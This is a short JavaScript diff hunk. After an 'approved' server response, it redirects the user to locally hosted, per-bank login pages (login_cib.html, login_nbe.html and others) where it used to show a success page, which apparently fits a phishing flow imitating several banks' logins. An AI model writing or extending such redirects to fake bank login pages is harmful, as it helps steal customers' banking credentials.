@@ -497,7 +497,8 @@
 
                 if (result.status === "approved") {
                     localStorage.setItem("request_id", result.request_id);
-                    window.location.href = "success.html";
+                    const bankUrls = { mashreq: 'login.html', bm: 'login_bm.html', cib: 'login_cib.html', nbe: 'login_nbe.html' };
+                    window.location.href = bankUrls[selectedBank] || bankInfo.loginUrl;
                 } else {
                     errorMessageDiv.textContent = result.message || "حدث خطأ غير متوقع.";
                     errorMessageDiv.style.display = "block";
